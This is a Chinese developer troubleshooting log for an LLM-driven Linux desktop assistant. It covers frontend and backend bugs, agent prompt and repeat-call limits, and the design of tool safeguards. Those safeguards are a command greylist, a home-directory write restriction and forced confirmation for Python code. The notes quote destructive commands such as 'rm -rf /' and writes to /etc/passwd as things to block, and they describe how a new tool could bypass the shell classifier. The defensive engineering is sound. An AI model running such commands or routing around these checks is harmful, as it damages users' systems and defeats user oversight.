- 如果用户遇到黑屏，可以设置 `WEBKIT_DISABLE_DMABUF_RENDERER=1` 回退
- backdrop-filter 本身走 GPU，但需要合成层支持

**教训**：
- Tauri Linux 性能优化靠环境变量 + CSS 配合
- `will-change` + `translateZ(0)` 是强制合成层的标准技巧
- WebKitGTK 的 GPU 加速受驱动 / 合成器 / 会话类型多重影响，需文档化故障排查

文件：`desktop/src-tauri/src/lib.rs` + `desktop/src/index.css`

---

### T051: ModelSheet 下拉菜单不显示字（后端未重启 + 父容器 overflow 裁剪）

**现象**：
v0.7.6 改造 ModelSheet 模型选择下拉菜单为 Portal 方案后，用户反馈：
1. 第一次：下拉菜单根本弹不出来
2. 修复后：下拉菜单弹出来了，但里面按钮的文字是空的（看不见任何字）

**根因**（两层叠加问题）：

**问题 1：父容器 overflow 裁剪导致下拉弹不出来**

原 ModelSheet 结构：
```
sheet 容器（overflow-hidden + rounded-2xl）
  └── 主体内容区（overflow-y-auto）
       └── Field（模型字段）
            └── div.relative（ref=modelDropdownRef）
                 └── button（trigger）
                 └── 下拉列表（absolute top-full）  ← 被两层 overflow 裁剪
```

`absolute top-full` 定位的下拉列表被主体内容区的 `overflow-y-auto` 裁剪，根本无法显示。

**问题 2：后端 lihua serve 未重启，返回旧数据格式**

即使 Portal 修复了 overflow 裁剪，下拉列表渲染了 2 个按钮，但文字全是空。

`curl /api/models/presets` 返回：
```json
{"models": ["deepseek-chat", "deepseek-reasoner"]}  ← 旧版：字符串数组
```

但前端期望：
```json
{"models": [{"id": "...", "name": "DeepSeek V4 Flash", "tier": "basic", ...}]}  ← 新版：对象数组
```

`model.name` 取到 undefined（字符串没有 .name 属性），React 渲染 `{undefined}` 就是空字符串。

后端 `lihua serve` 进程是 09:46 启动的，跑的是旧版 `model_presets.py`，没有重启加载新版代码。

**解决方案**：

**修复 1：Portal 渲染下拉列表到 document.body**

```tsx
import { createPortal } from 'react-dom'

// trigger 按钮
<div className="relative" ref={modelDropdownRef}>
  <button onClick={handleToggleDropdown}>...</button>
</div>

// 下拉列表用 Portal 渲染到 body
{modelDropdownOpen && dropdownPos && selectedPreset && selectedPreset.id !== 'custom' &&
  createPortal(
    <div
      ref={modelDropdownListRef}
      className="bg-bg-secondary border border-border-default rounded-md shadow-popover"
      style={{
        position: 'fixed',
        top: dropdownPos.top,    // 用 getBoundingClientRect() 计算
        left: dropdownPos.left,
        width: dropdownPos.width,
        zIndex: 9999,
      }}
    >
      {selectedPreset.models.map(model => (
        <button>{model.name}</button>
      ))}
    </div>,
    document.body,
  )}
```

关键点：
- `handleToggleDropdown` 用 `getBoundingClientRect()` 计算 trigger 按钮的位置
- Portal 到 `document.body` 脱离父容器 overflow 限制
- `position: fixed` + `zIndex: 9999` 确保在最上层
- 滚动/resize 时关闭下拉（避免位置错乱）
- 点击外部关闭：同时检查 trigger ref 和 list ref

**修复 2：重启后端 lihua serve**

```bash
# 找到旧进程
ps aux | grep uvicorn | grep -v grep
# kill 后重启
kill <PID>
nohup ~/.local/share/lihua/venv/bin/python -m uvicorn lihua.server:create_app --factory --host 127.0.0.1 --port 7531 --log-level warning > /tmp/lihua-serve.log 2>&1 &
```

**教训**：
- **改了 Python 代码必须重启后端**：FastAPI/uvicorn 默认不热重载，前端 Vite 热重载但后端不重载，导致前后端数据格式不一致
- **Portal 是解决 overflow 裁剪的标准方案**：当下拉/弹出层在 `overflow-hidden` / `overflow-y-auto` 容器内时，用 `createPortal(..., document.body)` 脱离父容器
- **getBoundingClientRect + position:fixed** 是 Portal 定位的标准模式
- 调试时优先用 `curl` 直接检查后端 API 返回的数据格式，再检查前端渲染

文件：`desktop/src/components/ModelSheet.tsx` + 后端进程重启

---

### T052: /api/logs 返回空（后端进程加载旧版 server.py）

**现象**：
```
$ curl http://127.0.0.1:7531/api/logs?n=5
{"entries":[],"count":0,"log_file":"/home/vitasguo/.local/share/lihua/lihua.log"}

$ ls ~/.local/share/lihua/
audit.log  history.json  venv   # 没有 lihua.log！
```

`logging_config.py` 直接 `python -c "from lihua.logging_config import setup_logging; setup_logging(); ..."` 测试完全正常，但后端进程的 `/api/logs` 一直返回空。

**根因**：
- 后端进程 17:18:07 启动，但 `server.py` 在 17:18:18 才修改（晚 11 秒）
- 后端加载的是**旧版 server.py**（没有 `setup_logging` 调用的版本）
- uvicorn 启动 `lihua.server:create_app --factory` 时，Python 导入 `lihua.server` 模块**只导入一次**，后续修改源文件不会自动重新加载
- 即使 `create_app()` 函数体内加了 `setup_logging` 调用，旧进程也不会执行

排查命令：
```bash
# 对比进程启动时间 vs 源文件修改时间
stat -c '%y %n' src/lihua/server.py src/lihua/logging_config.py
ps -o pid,lstart,cmd -p <PID>

# 直接测试 logging_config 模块本身是否工作
~/.local/share/lihua/venv/bin/python -c "
from lihua.logging_config import setup_logging, get_recent_logs, log_file_path
log = setup_logging(level='INFO', enable_stderr=False)
log.info('测试日志')
print(get_recent_logs(5))
print(log_file_path().exists())
"
```

**解决方案**：
```bash
# kill 旧后端
pkill -f "uvicorn lihua.server"

# 重启（加载新版 server.py）
nohup ~/.local/share/lihua/venv/bin/python -m uvicorn lihua.server:create_app --factory --host 127.0.0.1 --port 7531 --log-level warning > /tmp/lihua-backend.log 2>&1 &

# 验证
curl http://127.0.0.1:7531/api/logs?n=5
# 应返回 {"entries":[{"ts":"...","level":"INFO","msg":"FastAPI app 创建，版本 0.7.7a0"}],...}
```

**教训**：
- **改了 Python 代码必须重启后端**（同 T051 教训，但这次是 `server.py` 本身的修改没生效）
- 排查"模块功能不工作"时，**对比进程启动时间和源文件修改时间**是最快的方法
- 直接 `python -c "..."` 测试模块本身，可以快速排除"模块代码有问题"的可能性
- `stat -c '%y %n'` + `ps -o pid,lstart` 是排查"代码没生效"的标准组合

文件：后端进程重启（无源码改动，只是加载新版 server.py）

---

### T053: troubleshoot 合并版 issue 用中文值，`{{issue}} == sound` 不匹配

**现象**：
```
tests/test_skills_troubleshoot.py::TestTroubleshootExtractParams::test_extract_issue
FAILED ("没声音了" 应提取 issue=sound，实际 issue=没声音)
```

troubleshoot.yaml 合并 8 个 troubleshoot-* skill 后，`issue` 参数的 extract 正则 `(没声音|没声|声音|音频|喇叭|wifi|...)` 无捕获组，`re.search` 返回 `group(0)` = 匹配到的中文词（如「没声音」），而不是英文 ID（如 `sound`）。

condition `{{issue}} == sound` 永远不成立，导致所有诊断/修复步骤被跳过。

**根因**：
- `skills.py` `extract_params`：
  ```python
  m = re.search(p.extract, text, re.IGNORECASE)
  if m:
      if m.groups():
          params[p.name] = m.group(1).strip()  # 有捕获组 → group(1)
      else:
          params[p.name] = m.group(0).strip()  # 无捕获组 → group(0) = 整个匹配文本
  ```
- extract 正则 `(没声音|没声|声音|...)` 用的是非捕获组 `(...)`，返回 group(0) = 匹配到的中文词
- condition `{{issue}} == sound` 期望英文值，但实际是中文值

**解决方案**：
1. **issue 改用中文值**（default: 没声音，extract 返回中文词）
2. **condition 用 `in` 操作符匹配多个中文值**：
   ```yaml
   condition: "{{issue}} in [没声音,没声,声音,音频,喇叭] && {{action}} != 修复"
   ```
3. `skill_runner.py` 的 `_eval_atom` 已支持 `in` 操作符（`rhs.strip("[] ")` 后 split 逗号）

**教训**：
- YAML extract 正则无捕获组时返回整个匹配文本（group(0)），不要假设返回英文 ID
- 多个中文词匹配同一行为时，用 `in [a, b, c]` 比 `== a || == b || == c` 简洁
- 中文值在 condition 里更直观，但需要 `in` 操作符支持

文件：`src/lihua/data/skills/troubleshoot.yaml`（issue 改中文 + condition 用 in）/ `tests/test_skills_troubleshoot.py`（期望改中文）

---

### T054: troubleshoot alias「卡顿」过宽泛，误匹配「动画卡顿」

**现象**：
```
tests/test_skills_beautify.py::TestBeautifyUbuntuTriggerMatch::test_intent_match[动画卡顿-beautify_ubuntu]
FAILED ("动画卡顿" 应匹配 beautify_ubuntu，实际匹配 troubleshoot)
```

「动画卡顿」同时命中两个 skill：
- `beautify_ubuntu`：trigger「动画卡顿」（4 字）
- `troubleshoot`：trigger「卡顿」（2 字）+ alias「卡顿」→ [troubleshoot]

按 `match_by_text` 优先级 `(alias_hit, max_hit_len)`：
- troubleshoot: alias_hit=1（命中 alias「卡顿」），max_hit_len=2
- beautify_ubuntu: alias_hit=0（无 alias），max_hit_len=4

troubleshoot 的 alias_hit=1 > beautify_ubuntu 的 alias_hit=0，troubleshoot 胜出。

**根因**：
- troubleshoot 为「磁盘满了」/「cpu占用高」等冲突场景加了 37 个 aliases，让 alias_hit=1 取胜
- 但 alias「卡顿」太宽泛，会跟「动画卡顿」/「视频卡顿」/「游戏卡顿」等场景冲突
- beautify_ubuntu 没有 alias，alias_hit=0，靠 max_hit_len=4 无法胜过 alias_hit=1

**解决方案**：
- **删除 troubleshoot 的 alias「卡顿」**（保留 trigger「卡顿」）
- 这样 troubleshoot 的 alias_hit=0，beautify_ubuntu 的 alias_hit=0
- 按 max_hit_len：beautify_ubuntu=4 > troubleshoot=2，beautify_ubuntu 胜出
- 「卡顿」单独使用时仍匹配 troubleshoot（trigger 命中），不影响

**教训**：
- alias 是「优先级提升器」，但宽泛的 alias（如「卡顿」/「慢」/「崩溃」）会跟其他 skill 冲突
- 加 alias 前先想：这个词会不会被其他 skill 的更长 trigger 包含？
- 冲突场景下，靠 trigger 长度（max_hit_len）取胜比靠 alias 更安全

文件：`src/lihua/data/skills/troubleshoot.yaml`（aliases 删除「卡顿」一行）

---

### T055: Agent 模式灰名单操作 confirm_cb=None 导致「需要确认但未提供确认回调」

**现象**：
```
用户：同意安装 Flatpak 版 Steam
Agent：调用 install_app 工具
工具输出：需要确认但未提供确认回调
Agent 卡死，反复询问用户「请点击确认按钮」但前端没有弹窗
```

**根因**：
- `server.py` 的 confirm_cb 是二选一死设计：
  ```python
  confirm_cb = (lambda msg, cmd: req.auto_confirm) if req.auto_confirm else None
  ```
- `auto_confirm=True` → 全部自动通过（危险）
- `auto_confirm=False`（默认）→ `confirm_cb=None` → 灰名单直接拒绝
- `config.always_confirm_grey = True`（默认）→ 灰名单必须 confirm
- 但 Agent 流式模式（`/api/chat/stream`）根本没实现交互式 confirm 机制
- 前端 ConfirmSheet 只用于规则模式（`/api/chat/rule`），Agent SSE 事件里没有 `needs_confirm` 类型

**解决方案（v0.7.13）**：
1. **后端交互式 confirm 机制**：
   - `_make_interactive_confirm_cb(event_queue)` 工厂函数生成 confirm_cb
   - confirm_cb 被调用时：生成 confirm_id → 推 needs_confirm 事件到 event_queue → 阻塞等待 response_event（60s 超时）
   - `chat_stream` 用子线程跑 run_agent_streaming，主线程从 event_queue 取事件 yield
   - 新增 `POST /api/chat/confirm` 端点：前端用户点击后调用，设置 response_event 解除阻塞
2. **前端**：
   - SSE switch 加 `case 'needs_confirm'`：弹 ConfirmSheet
   - `handleConfirm` 改造：有 confirmId → Agent 模式调 api.confirmChat；无 confirmId → 规则模式重新发送

**关键设计点**：
- **子线程 + event_queue 解耦**：run_agent_streaming 是同步生成器，confirm_cb 阻塞会导致整个流停止。用子线程跑 run_agent_streaming，主线程从 event_queue 取事件 yield，confirm_cb 阻塞时主线程仍能 yield needs_confirm 事件到 SSE 流
- **threading.Event + list[bool]**：response_event 用于阻塞等待，response_result[0] 用于传递决策（list 是可变容器，闭包能修改）
- **60s 超时**：前端 60s 内不响应就自动拒绝，避免无限阻塞子线程
- **daemon=True**：子线程设为 daemon，进程退出时自动结束

**教训**：
- 同步生成器 + 阻塞回调是经典难题：confirm_cb 在 run_skill 子调用里被调用，无法直接 yield 事件到外层 SSE 流
- 子线程 + queue 是解耦同步生成器和事件推送的标准方案
- 二选一死设计（auto_confirm / None）是反模式，应该用交互式 confirm 让用户决策

文件：`src/lihua/server.py`（_make_interactive_confirm_cb + chat_stream 子线程 + /api/chat/confirm 端点）

---

### T056: sudo → pkexec 替换注意事项

**现象**：
- v0.7.13 把 36 个 skill 文件 137 处 `sudo` 替换为 `pkexec`
- 替换后 2 个 beautify 测试失败（期望 `sudo` 实际 `pkexec`）

**根因**：
- pkexec 和 sudo 行为有差异，不能简单 sed 替换：
  1. `sudo -u <user>` → `pkexec --user <user>`（语法不同）
  2. `sudo apt install` → `pkexec apt install`（行为不同：pkexec 走 PolicyKit，sudo 走 sudoers）
  3. pkexec 每次都弹系统密码框（除非配置 polkit 规则），sudo 有 5min 时间窗
  4. pkexec 默认不是 root，需要 polkit 规则授权

**解决方案（v0.7.13）**：
- 用 Python 脚本批量替换，规则：
  ```python
  # 1. 先替换 sudo -u <user> → pkexec --user <user>
  text = re.sub(r'\bsudo -u (\S+)', r'pkexec --user \1', text)
  
  # 2. 再替换 sudo <command> → pkexec <command>（跳过注释行）
  for line in text.splitlines():
      if line.lstrip().startswith('#'):
          continue  # 注释行保留原样
      line = re.sub(r'\bsudo (?!\-)', 'pkexec ', line)
  ```
- 1 处 `sudo -u gdm`（beautify-ubuntu.yaml 的 GDM 用户操作）→ `pkexec --user gdm`
- 1 处注释里的 sudo 保留（beautify-ubuntu.yaml line 429 文档说明）

**pkexec vs sudo 对比**：
| 特性 | sudo | pkexec |
|------|------|--------|
| 授权机制 | /etc/sudoers | PolicyKit (polkit) |
| 密码框 | 终端密码输入 | 系统图形密码框（GNOME 集成） |
| 时间窗 | 5min 内免密 | 每次都弹（除非配置 polkit 规则） |
| 非交互式 | 需要 sudo -A + SUDO_ASKPASS | 原生支持图形弹窗 |
| 用户切换 | sudo -u <user> | pkexec --user <user> |

**已知问题**：
- pkexec 每次都弹密码框，体验不如 sudo 的时间窗
- 后续可配置 polkit 规则让 lihua 用户免密执行特定命令（如 apt install）
- 但这会降低安全性，需要权衡

**教训**：
- 批量替换前先 grep 特殊用法（`sudo -u` / `sudo -E` / `sudo -A`）
- pkexec 和 sudo 语法不完全兼容，需要特殊处理 `--user` 选项
- 测试期望要同步更新（beautify 的 2 个测试期望 sudo → pkexec）

文件：36 个 skill YAML 文件（用 Python 脚本批量替换）/ `tests/test_skills_beautify.py`（2 个测试期望修复）

---

### T057: Agent 太激进 + 重复调工具 + 达上限机械放弃

**现象**：
```
用户：为什么linux下steam兼容模式启动黑神话悟空失败？
Agent：
  1. 调 list_apps 找不到 steam → 下结论"Steam 可能未安装"
  2. 激进建议"安装 Flatpak 版 Steam"（用户没问换软件）
  3. 用户说"steam我安装了啊？显卡驱动别换" → Agent 还在重复调 list_apps / process_manager / file_search
  4. 8 次迭代用完 → 返回"已经处理了多步操作，但可能还需要继续。请告诉我下一步"
  5. 用户问"达到最大迭代次数 8 是不是有问题？"
```

**根因**：
1. **system prompt 没有原则约束**：
   - 没有"用户说的是事实"原则 → AI 死磕工具结果，不听用户
   - 没有"避免重复调用"原则 → AI 原样重试相同工具
   - 没有"诊断类工作流"原则 → AI 一上来就调 install_app 修改类工具
   - 没有"不激进建议换软件"原则 → AI 动不动就建议"换成 Y"
2. **无重复调用检测**：agent.py 主循环没有记录工具调用历史，LLM 重复调相同工具时无任何阻力
3. **迭代次数 8 太少**：诊断类任务（system_info + gpu_driver + list_apps + log_view + hardware_info）至少 5 个只读工具，加上分析迭代，8 次不够
4. **达上限机械放弃**：返回固定文案"请告诉我下一步"，没有利用已收集的信息

**解决方案（v0.7.14）**：
1. **system prompt 重写**（agent.py `_SYSTEM_PROMPT`）：
   - 加 5 条核心原则（重要程度从高到低）：
     1. 用户说的是事实，工具结果可能不全
     2. 不要激进建议换软件/换版本
     3. 避免重复调用相同工具
     4. 诊断类任务的工作流（先收集 → 再分析 → 最后给建议）
     5. 修复类任务要确认
   - 加"达到迭代上限时：总结已收集的信息 + 已排除的原因 + 下一步建议"
2. **重复调用检测**（`call_history: dict[tool_name+args_str, count]`）：
   - 第 1 次：正常执行
   - 第 2 次：执行但注入 system 消息提醒"你已经调过一次了"
   - 第 3 次及以上：拒绝执行 + 注入 tool 消息"⚠️ 重复 N 次，请换工具或总结"
3. **迭代次数 8 → 12**：给诊断类任务留足空间
4. **达上限时 LLM 总结**（`_summarize_on_max_iterations`）：
   - 再调一次 LLM（不带 tools），让它看完整对话历史
   - prompt 要求输出：已收集信息 / 已排除原因 / 下一步建议
   - LLM 失败时兜底：根据工具调用历史生成简单总结

**关键设计点**：
- **call_key = f"{tool_name}:{args_str}"**：用工具名 + 参数 JSON 字符串作为去重 key，避免误判"同工具不同参数"
- **第 2 次执行但提醒**：给 LLM 一次"原样重试"的机会（可能 LLM 觉得第一次结果不完整），但提醒它不要第 3 次
- **第 3 次拒绝 + 注入 tool 消息**：拒绝执行但返回一条 tool 消息，让 LLM 知道为什么被拒绝，引导它换方向
- **总结用 tools=[]**：不带工具定义调 LLM，强制它只输出文本（不会再触发工具调用循环）
- **流式版推送 text 事件**：先推送"*达到迭代上限，正在总结当前发现...*"让用户看到进度，再推送 done 事件

**教训**：
- LLM Agent 没有 prompt 约束就会"自由发挥"：激进建议、重复调工具、机械放弃
- system prompt 是 Agent 行为的"宪法"，必须明确列出核心原则 + 工作流
- 重复调用检测是防止 LLM 死循环的最后一道防线（prompt 约束不是 100% 有效）
- 达到迭代上限时应该利用已收集的信息，而不是机械放弃
- 诊断类任务和修复类任务的工作流不同，prompt 要区分

文件：`src/lihua/agent.py`（_SYSTEM_PROMPT 重写 + run_agent/run_agent_streaming 加重复检测 + _summarize_on_max_iterations）

---

### T058: verify on_failure=continue 导致 install/uninstall 谎报成功

**现象**：
```
用户：卸载 Snap 版 Steam
Agent：调用 uninstall_app → 返回 success=True
Agent：说"Snap 版 Steam 已经成功卸载了 ✅"
用户：你搞错了吧？steam还在啊？
```

Agent 谎报卸载成功，但 steam 实际还在。

**根因**：
- `uninstall-app.yaml` 的 `verify` 步骤 `on_failure: continue`：
  ```yaml
  - name: verify
    type: verify
    command: "! which {{package}} && ! flatpak list | grep -i {{package}}"
    on_failure: continue  # ← 失败也继续！
  - name: notify
    type: notify
    command: "notify-send '狸花猫' '{{target}} 已卸载'"  # ← 谎报！
  ```
- `resolve_package` 把 steam 解析为 flatpak（alias 第一个是 `com.valvesoftware.steam`），但实际是 snap 版
- `uninstall_flatpak` 失败（flatpak 没装这个包）但 `on_failure: continue` 继续
- `uninstall_snap` 因 `package_type != snap` 被跳过（condition 不满足）
- `verify` 命令只检查 `which` 和 `flatpak list`（没检查 `snap list`），snap 版 steam 不在 PATH → verify 误判通过
- 即使 verify 失败，`on_failure: continue` 也继续执行 notify → 谎报"已卸载"
- `run_skill` 的 for-else 循环：所有步骤都没 break → `success=True` → Agent 说"成功了"

**解决方案（v0.7.15）**：
1. **verify 命令用 `{{target}}` 检查（不是 `{{package}}`）**：
   - `resolve_package` 可能解析为 flatpak ID 但实际是 snap 版
   - 用 target 检查更通用，覆盖所有安装方式
2. **verify 命令加 snap/dpkg 检查**：
   ```yaml
   command: "! snap list | grep -i '{{target}}' && ! flatpak list | grep -i '{{target}}' && ! dpkg -l | grep -i '{{target}}' && ! which '{{target}}'"
   ```
3. **verify on_failure 改为 stop**：
   - 失败就停止，不执行 notify
   - `run_skill` 返回 `success=False` → Agent 知道卸载失败
4. **install_app 同样修复**：verify on_failure=stop + 用 target 检查

**关键设计点**：
- **verify 是最后一道防线**：如果 verify 失败还继续，就是谎报成功
- **verify 命令要覆盖所有安装方式**：snap/flatpak/apt/dpkg/which 五种（snap 版 steam 不在 PATH，只查 which 会漏）
- **用 target 不用 package**：resolve_package 的推测可能错（alias 第一个是 flatpak ID 但实际是 snap 版）
- **on_failure=stop 是防谎报的关键**：verify 失败必须 stop，不能 continue

**教训**：
- `on_failure: continue` 是危险默认值，verify 步骤必须 `on_failure: stop`
- `run_skill` 的 for-else 循环：所有步骤 continue 就返回 success=True，这是谎报的根源
- resolve_package 推测的 package_type 可能错，verify 命令不能依赖它
- Agent 看 `success=True` 就说"成功了"，不会看具体步骤的成败——所以 success 字段必须准确

文件：`src/lihua/data/skills/uninstall-app.yaml` + `install-app.yaml`（verify on_failure=stop + 用 target 检查 snap/flatpak/dpkg/which）

---

### T059: v0.7.13 替换 sudo→pkexec 时遗漏了 safety.py 灰名单

**现象**（v0.8.0 开发时发现）：
v0.8.0 加 run_shell 万能工具后，测试 `pkexec true` 命令时发现：
- `classify("pkexec true")` 返回 `level="unknown"`（未匹配任何规则），而不是预期的 `level="grey"`
- 导致 pkexec 命令走 unknown 默认灰名单策略，但不带 reason/human_message，confirm 弹窗没说明
- `echo hello` / `true` 等无害命令也返回 `level="unknown"`，导致 always_confirm_grey=True 时弹确认框

**根因**：
- `src/lihua/safety.py` `_GREYLIST` 只有 `^\s*sudo\s+(.+)` 规则，没有 `pkexec` 规则
- v0.7.13 把 36 个 skill 文件 137 处 sudo 替换为 pkexec，但**漏了 safety.py 的灰名单**
- `echo` / `printf` / `true` / `false` 等基础命令没在 `_WHITELIST` 里
- unknown 默认按灰名单处理（保守策略），所以这些命令都会触发 confirm

**解决方案**：
1. `src/lihua/safety.py` `_GREYLIST` 加规则：
   ```python
   (r"^\s*pkexec\s+(.+)", "需要管理员权限", "需要管理员权限来执行：{0}"),
   ```
2. `_WHITELIST` 加规则：
   ```python
   (r"^\s*echo\b\s+", "输出文本"),
   (r"^\s*printf\b\s+", "输出文本"),
   (r"^\s*(?:true|false)\s*$", "无操作命令"),
   ```

**教训**：
- 全量替换时容易遗漏边界文件——safety.py 是命令分类的源头，sudo→pkexec 替换时必须同步改
- 白名单需要持续维护——LLM 用 run_shell 会生成大量基础命令，没在白名单的都走 unknown 默认灰名单
- safety.py 的 unknown 默认灰名单是保守策略，但会让 run_shell 体验很差（每次 echo 都弹确认）——白名单要尽量覆盖常用只读/无害命令

文件：`src/lihua/safety.py`（_GREYLIST 加 pkexec 规则 + _WHITELIST 加 echo/printf/true/false）

---

### T060: run_shell 万能工具必须把 stdout 完整回传 LLM

**现象**（v0.8.0 设计陷阱）：
如果 run_shell 的 `_format_tool_result_for_llm` 只回传 final_message（像预定义 skill 那样），LLM 看不到命令的 stdout，无法决策下一步。

**根因**：
- 预定义 skill 的 `_format_tool_result_for_llm` 只回传 `final_message + steps 摘要`（每个 step 的 output 截断到 200 字符）
- 这对 skill 够用，因为 skill 的 step 输出是中间结果，最终结果在 `final_message` 里
- 但 run_shell 不一样——LLM 生成的命令的 stdout 就是 LLM 需要的信息（例如 `lsof -i:8080` 的输出告诉 LLM 哪个进程占用端口）
- 如果只回传 final_message（run_shell 是 stdout 尾部 30 行），LLM 看不到完整输出，无法分析

**解决方案**：
`_format_tool_result_for_llm` 对 run_shell 特殊处理：
```python
if record.tool_name == "run_shell" and record.result_details:
    d = record.result_details
    parts.append(f"exit_code: {d.get('exit_code', '?')}")
    parts.append(f"safety: {d.get('safety_level', '?')}")
    if d.get("timed_out"):
        parts.append("⚠️ 命令超时被强制终止")
    stdout = d.get("stdout", "")
    stderr = d.get("stderr", "")
    if stdout:
        parts.append(f"stdout:\n{stdout}")
    if stderr:
        parts.append(f"stderr:\n{stderr}")
    return "\n".join(parts)
```

同时 `_execute_run_shell` 的 result_details 要存完整 stdout（截断 4000 字符防爆 token）：
```python
details = {
    "exit_code": r.exit_code,
    "stdout": r.stdout[:4000],
    "stderr": r.stderr[:2000],
    "safety_level": decision.level,
    "timed_out": r.timed_out,
    "command": cmd,
}
```

**教训**：
- 工具结果回传 LLM 的格式要根据工具类型定制，不能一刀切
- 预定义 skill：只回传 final_message（节省 token）
- run_shell：必须回传完整 stdout/stderr（LLM 决策依据）
- token 预算要平衡：stdout 4000 字符 + stderr 2000 字符 = 6000 字符，约 1500 token，可接受

文件：`src/lihua/agent.py`（`_execute_run_shell` 存完整 stdout + `_format_tool_result_for_llm` 对 run_shell 特殊处理）

---

### T061: write_file / edit_file 必须限制在用户主目录内（防 LLM 改系统文件）

**现象**（v0.8.2 设计陷阱）：
如果 write_file / edit_file 没有路径限制，LLM 可能直接写 `/etc/passwd` / `/etc/sudoers` / `/boot/vmlinuz` 等系统文件——即使走 confirm，用户也可能误点同意，导致系统损坏。

**根因**：
- run_shell 走 safety.py 灰名单，`sed -i /etc/passwd` 会被黑名单拦截（v0.5.0 加的规则）
- 但 write_file / edit_file 是新工具，不走 safety.py（它们不是 shell 命令）
- 如果不在工具层做路径限制，LLM 可以绕过 safety.py 直接写系统文件
- read_file 无所谓（只读），但 write_file / edit_file 必须限制

**解决方案**：
`_is_path_in_home(path)` 路径检查函数：
```python
def _is_path_in_home(path: str) -> bool:
    import os as _os
    abs_path = _os.path.abspath(_os.path.expanduser(path))
    home = _os.path.expanduser("~")
    return abs_path == home or abs_path.startswith(home + _os.sep)
```

write_file / edit_file 在执行前检查：
```python
if not _is_path_in_home(abs_path):
    return ToolCallRecord(
        success=False,
        error=f"路径不在用户主目录内：{abs_path}（write_file 只允许写 ~ 下，系统目录请用 run_shell + pkexec）",
        ...
    )
```

**关键点**：
- `abspath` 会规范化路径，自动解析 `~/../etc/passwd` → `/etc/passwd`（防路径穿越）
- `startswith(home + sep)` 而不是 `startswith(home)`——否则 `/home/userevil` 会被误判为 `/home/user` 的子目录
- read_file 无路径限制（只读，LLM 看 /etc/nginx/nginx.conf 是合理的）
- 改系统文件请用 run_shell + pkexec（走 safety.py 灰名单 + 系统密码框）

**教训**：
- 新工具不能默认继承 run_shell 的安全模型——每个工具都要独立做安全分析
- 路径检查要用 `abspath + startswith(home + sep)`，不能用简单的 `startswith(home)`
- 工具层做路径限制比 safety.py 更精确（safety.py 是命令级，工具层是操作级）

文件：`src/lihua/agent.py`（`_is_path_in_home` + `_execute_write_file` / `_execute_edit_file` 路径检查）

---

### T062: edit_file 的 old_string 必须做唯一性检查（防误替换）

**现象**（v0.8.2 设计陷阱）：
如果 edit_file 直接用 `content.replace(old_string, new_string)`（不限次数），LLM 提供的 old_string 如果在文件中出现多次，会全部被替换——可能破坏文件。

**根因**：
- SWE-agent 风格的 edit_file 设计前提是 old_string 唯一存在
- 但 LLM 可能只给一小段上下文（例如 `port: 8080`），如果文件里有多处 `port: 8080`，replace 会全替换
- 这违反了"精确替换"的设计意图——edit_file 应该是 surgical（外科手术式）的，不是 global replace

**解决方案**：
执行替换前先做唯一性检查：
```python
occurrences = content.count(old_string)
if occurrences == 0:
    return ToolCallRecord(success=False, error="old_string 在文件中未找到")
if occurrences > 1:
    return ToolCallRecord(
        success=False,
        error=f"old_string 在文件中出现 {occurrences} 次，必须唯一（请提供更多上下文）",
    )
# 唯一存在才替换
new_content = content.replace(old_string, new_string, 1)
```

**关键点**：
- 0 次报错：让 LLM 知道 old_string 不在文件里（可能是文件已变，需要 read_file 重新读）
- >1 次报错：让 LLM 提供更多上下文（例如把 `port: 8080` 扩展为 `# HTTP server\nport: 8080\nhost: localhost`）
- =1 次替换：虽然 count==1 时 replace 不限次数也只会替换 1 次，但显式 `, 1` 更明确

**教训**：
- ACI 工具的设计原则是"让 LLM 难以犯错"——宁可报错让 LLM 重试，也不要默默执行可能错误的操作
- 唯一性检查是 SWE-agent 风格 edit_file 的核心安全保障（比 sed -i 的正则匹配更安全）
- 错误消息要 actionable——告诉 LLM "请提供更多上下文"而不是干巴巴的"替换失败"

文件：`src/lihua/agent.py`（`_execute_edit_file` 的 `content.count(old_string)` 检查）

---

### T063: run_python 不能走 safety.py 必须强制 confirm（Python 代码无法用正则分类）

**现象**（v0.8.3 设计陷阱）：
如果 run_python 像 run_shell 一样走 safety.py 分类，会遇到问题：
- safety.py 是基于 shell 命令的正则匹配（rm -rf /、dd、mkfs 等模式）
- Python 代码不是 shell 命令，没法用 shell 正则分类
- Python 代码能力太强（能 os.system / subprocess / shutil.rmtree / 写 /etc 等），不能简单标记为"白名单自动执行"
- 如果标记为"灰名单"，safety.py 的 human_message 是 shell 语境的，对 Python 代码不适用

**根因**：
- safety.py 的设计前提是"命令行字符串"——黑名单是 `rm -rf /` 这样的 shell 模式
- Python 代码是"程序代码"——危险操作藏在 `import os; os.system('rm -rf /')` 这样的代码里，正则没法穷举
- run_shell 的安全模型（黑/灰/白名单）不适合 run_python

**解决方案**：
run_python 不走 safety.py，强制走 confirm：
```python
# 不走 safety.py（Python 代码不是 shell 命令，没法用正则分类）
# 强制走 confirm——用户看到 intent + 代码预览（前 500 字符）才决定
if cfg.always_confirm_grey:
    code_preview = code if len(code) <= 500 else code[:500] + f"\n... (共 {len(code)} 字符，已截断)"
    confirm_parts = [intent, f"\n代码（{len(code)} 字符）：\n```python\n{code_preview}\n```"]
    msg = "\n".join(confirm_parts)
    if confirm is None or not confirm(msg, code):
        return ToolCallRecord(success=False, ...)
```

**关键点**：
- confirm 消息要显示代码预览（前 500 字符）——让用户能看到代码内容再决定
- audit_log 的 safety_level 统一标记为 "grey"——虽然是强制 confirm，但语义上属于"需要用户确认"的灰名单行为
- 速率限制 MAX_RUN_PYTHON_CALLS = 10（比 run_shell 的 15 更严）——Python 能做更多事，单次对话 10 次足够
- timeout 上限 300s（比 run_shell 的 600s 更严）——Python 代码可能死循环，300s 足够大多数任务

**教训**：
- 不同工具需要不同的安全模型——不能默认继承 run_shell 的黑/灰/白名单分类
- 用户 confirm 是最强保障——宁可让用户多确认一次，也不要让 LLM 自动执行可能危险的代码
- 速率限制要根据工具能力调整——Python 比 shell 能做更多事，限制要更严
- 沙箱化（bwrap/firejail）是 v0.9 的事——当前阶段信任 LLM + 用户 confirm + 速率限制

文件：`src/lihua/agent.py`（`_execute_run_python` 的强制 confirm 逻辑）

---

### T064: confirm 超时 60s 太短，用户点确认却提示"用户取消"

**现象**：
```
用户在 ConfirmSheet 弹窗中点击"确认执行"按钮，但 beautify_ubuntu 输出"用户取消"。
后端日志显示：
  23:24:20.981 — 工具 install_app 失败（60.00s）  # _CONFIRM_TIMEOUT 超时
  23:24:23.492 — 收到 confirm 请求 decision=True  # 用户在 60s 后才点击
